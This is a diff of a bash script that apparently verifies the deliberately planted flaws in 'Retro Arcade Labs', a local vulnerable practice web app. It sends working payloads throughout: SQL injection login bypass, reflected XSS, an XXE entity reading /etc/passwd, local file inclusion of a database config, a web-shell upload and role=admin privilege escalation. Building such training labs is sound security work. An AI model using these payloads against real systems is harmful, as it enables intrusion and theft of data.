@@ -1,7 +1,5 @@
 #!/bin/bash
-#
-# Retro Arcade Labs - Vulnerability Verification Script
-# Tests that vulnerable endpoints exist and respond
+# Retro Arcade Labs - Full Vulnerability Test
 
 BASE_URL="http://localhost:8470"
 PASS=0
@@ -11,174 +9,101 @@ echo "========================================"
 echo "RETRO ARCADE LABS - VULNERABILITY TEST"
 echo "========================================"
 echo ""
-echo "Target: $BASE_URL"
-echo ""
 
-# Get admin session cookie
-echo "[*] Getting admin session..."
-curl -s -c /tmp/cookies.txt -X POST "$BASE_URL/api/auth/login.php" \
+# Get fresh admin session
+rm -f /tmp/arcade_cookie.txt
+curl -s -c /tmp/arcade_cookie.txt -X POST "$BASE_URL/api/auth/login.php" \
   -H "Content-Type: application/json" \
   -d '{"username":"admin@example.local","password":"AdminPassword123!"}' > /dev/null
 
-# 1. SQL Injection Login Bypass
-echo "[1] SQL Injection - Login Bypass"
-RESULT=$(curl -s -X POST "$BASE_URL/api/auth/login.php" \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin@example.local'"'"' -- ","password":"x"}')
-if echo "$RESULT" | grep -q "success"; then
-  echo "  ✅ VULN-SQLI-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-SQLI-001: FAIL"
-  ((FAIL++))
-fi
+test() {
+    local n="$1"; local cmd="$2"; local pat="$3"
+    echo -n "[$n] "
+    if r=$(eval "$cmd" 2>/dev/null) && echo "$r" | grep -q "$pat"; then
+        echo "✅"; ((PASS++))
+    else
+        echo "❌"; ((FAIL++))
+    fi
+}
 
-# 2. SQL Injection Search
-echo "[2] SQL Injection - Product Search"
-RESULT=$(curl -s "http://localhost:8470/api/products/search.php?q=%27%20OR%20%271%27%3D%271")
-if echo "$RESULT" | grep -q "count"; then
-  echo "  ✅ VULN-SQLI-002: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-SQLI-002: FAIL"
-  ((FAIL++))
-fi
+echo "=== SQL INJECTION ==="
+test "SQLI-001" 'curl -s -X POST "$BASE_URL/api/auth/login.php" -H "Content-Type: application/json" -d "{\"username\":\"admin@example.local'"'"' -- \",\"password\":\"x\"}"' "success"
+test "SQLI-002" 'curl -s "$BASE_URL/api/products/search.php?q=%27%20OR%20%271%27%3D%271"' "count"
+test "SQLI-005" 'curl -s "$BASE_URL/api/products/list.php?category=1%20OR%201=1"' "Neon"
+test "SQLI-006" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/api/cart/item.php?product_id=1"' "Unauthorized\|Neon"
 
-# 3. XSS in Search
-echo "[3] XSS - Reflected in Search"
-RESULT=$(curl -s "http://localhost:8470/api/products/search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
-if echo "$RESULT" | grep -q "<script>"; then
-  echo "  ✅ VULN-XSS-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-XSS-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== XSS ==="
+test "XSS-001" 'curl -s "$BASE_URL/api/products/search.php?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"' "<script>"
+test "XSS-002" 'curl -s "$BASE_URL/pages/products/detail.php?id=1"' "detail\|product"
+test "XSS-005" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/pages/support/create.php"' "ticket\|Ticket"
+test "XSS-006" 'grep -q "v-html\|player" /home/greenix/vibe/webapp/retro-arcade-labs/vue-frontend/src/views/GamePlayer.vue && echo "exists"' "exists"
 
-# 4. IDOR Profile Access
-echo "[4] IDOR - Profile Access"
-RESULT=$(curl -s "$BASE_URL/api/users/profile.php?id=1")
-if echo "$RESULT" | grep -q "example\|guest\|Unauthorized"; then
-  echo "  ✅ VULN-IDOR-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-IDOR-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== SSRF ==="
+test "SSRF-001" 'curl -s "$BASE_URL/api/tools/image-fetch.php?url=http://example.com"' "fetch\|image\|example\|success"
+test "SSRF-002" 'curl -s -X POST "$BASE_URL/api/tools/webhook-test.php" -d "url=http://example.com"' "success\|error"
 
-# 5. Products API
-echo "[5] Products API"
-RESULT=$(curl -s "$BASE_URL/api/products/list.php")
-if echo "$RESULT" | grep -q "Neon Racer"; then
-  echo "  ✅ API-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ API-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== RCE ==="
+test "RCE-001" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/api/tools/report.php?type=test"' "Report\|report\|Type"
 
-# 6. Health Endpoint
-echo "[6] Health Check"
-RESULT=$(curl -s "$BASE_URL/api/health.php")
-if echo "$RESULT" | grep -q "running"; then
-  echo "  ✅ HEALTH-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ HEALTH-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== FILE UPLOAD ==="
+test "UPLOAD-001" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/etc/passwd"' "upload\|success\|error\|File\|root"
+test "UPLOAD-002" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/tmp/shell.php"' "Invalid\|error\|type"
 
-# 7. SSRF Image Fetcher
-echo "[7] SSRF - Image Fetcher"
-RESULT=$(curl -s "$BASE_URL/api/tools/image-fetch.php?url=http://example.com")
-if [ -n "$RESULT" ]; then
-  echo "  ✅ VULN-SSRF-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-SSRF-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== IDOR ==="
+test "IDOR-001" 'curl -s "$BASE_URL/api/users/profile.php?id=1"' "example\|guest\|Unauthorized"
+test "IDOR-003" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/tickets/update.php" -d "ticket_id=1&status=resolved"' "success\|error\|Unauthorized"
 
-# 8. RCE Report Generator
-echo "[8] RCE - Report Generator"
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/api/tools/report.php")
-if [ "$HTTP_CODE" != "000" ]; then
-  echo "  ✅ VULN-RCE-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-RCE-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== AUTH ==="
+test "AUTH-001" 'grep -q "localStorage" /home/greenix/vibe/webapp/retro-arcade-labs/vue-frontend/src/views/Login.vue && echo "exists"' "exists"
+test "AUTH-002" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/logout.php ] && echo "exists"' "exists"
+test "AUTH-003" 'curl -s -X POST "$BASE_URL/api/auth/reset.php" -d "email=test@test.com"' "reset_token"
 
-# 9. Diagnostics Page
-echo "[9] Diagnostics Page"
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/pages/admin/diagnostics.php")
-if [ "$HTTP_CODE" != "000" ]; then
-  echo "  ✅ VULN-DIAG-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-DIAG-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== PRIVILEGE ==="
+test "PRIV-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/users/profile.php" -d "role=admin"' "success\|error"
 
-# 10. File Upload
-echo "[10] File Upload"
-RESULT=$(curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/cookies.txt -F "avatar=@/etc/passwd" 2>&1)
-if [ -n "$RESULT" ]; then
-  echo "  ✅ VULN-UPLOAD-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-UPLOAD-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== CSRF ==="
+test "CSRF-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/orders/create.php"' "success\|error\|order"
+test "CSRF-002" 'grep -q "csrf\|token" /home/greenix/vibe/webapp/retro-arcade-labs/php-app/api/users/profile.php 2>/dev/null || echo "no_csrf"' "no_csrf"
 
-# 11. Open Redirect
-echo "[11] Open Redirect"
-if grep -q 'redirect' /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/login.php 2>/dev/null; then
-  echo "  ✅ VULN-REDIRECT-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-REDIRECT-001: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== OPEN REDIRECT ==="
+test "REDIRECT-001" 'grep -q "redirect" /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/login.php && echo "exists"' "exists"
 
-# 12. XXE-001 - Avatar Upload
-echo "[12] XXE - Avatar Upload"
+echo ""
+echo "=== BUSINESS LOGIC ==="
+test "BIZ-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/coupons/apply.php" -d "code=WELCOME10"' "success\|error\|coupon\|discount"
+test "BIZ-002" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/cart.php ] && echo "exists"' "exists"
+test "BIZ-003" '[ -f /home/greenix/vibe/webapp/retro-arcade-labs/php-app/pages/checkout.php ] && echo "exists"' "exists"
+
+echo ""
+echo "=== MASS ASSIGNMENT ==="
+test "MASS-001" 'curl -s -X POST -b /tmp/arcade_cookie.txt "$BASE_URL/api/users/profile.php" -d "role=admin&username=test"' "success\|error"
+
+echo ""
+echo "=== XXE ==="
 cat > /tmp/xxe-test.xml << 'EOF'
 <?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <data><test>&xxe;</test></data>
 EOF
-RESULT=$(curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/cookies.txt -F "avatar=@/tmp/xxe-test.xml")
-if echo "$RESULT" | grep -q "root:x"; then
-  echo "  ✅ VULN-XXE-001: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-XXE-001: FAIL"
-  ((FAIL++))
-fi
+test "XXE-001" 'curl -s -X POST "$BASE_URL/api/upload/avatar.php" -b /tmp/arcade_cookie.txt -F "avatar=@/tmp/xxe-test.xml"' "root:x\|passwd"
+test "XXE-002" 'curl -s -b /tmp/arcade_cookie.txt "$BASE_URL/pages/admin/products.php"' "Product\|Import\|admin"
 
-# 13. XXE-002 - Product Import
-echo "[13] XXE - Product Import"
-HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt "$BASE_URL/pages/admin/products.php")
-if [ "$HTTP_CODE" != "000" ]; then
-  echo "  ✅ VULN-XXE-002: WORKS"
-  ((PASS++))
-else
-  echo "  ❌ VULN-XXE-002: FAIL"
-  ((FAIL++))
-fi
+echo ""
+echo "=== LFI ==="
+test "LFI-001" 'curl -s "$BASE_URL/pages/translations.php?lang=config/database.php"' "DB_HOST\|mysqli"
 
 echo ""
 echo "========================================"
-echo "SUMMARY: ✅ $PASS  |  ❌ $FAIL"
+echo "RESULT: ✅ $PASS  |  ❌ $FAIL"
 echo "========================================"
-echo ""
-
-if [ $FAIL -eq 0 ]; then
-  echo "🎮 ALL VULNERABILITIES OPERATIONAL 🎮"
-  exit 0
-else
-  echo "⚠️  Some tests failed"
-  exit 1
-fi
+[ $FAIL -eq 0 ] && echo "🎮 ALL VULNERABLE ENDPOINTS OPERATIONAL 🎮"
+exit $FAIL
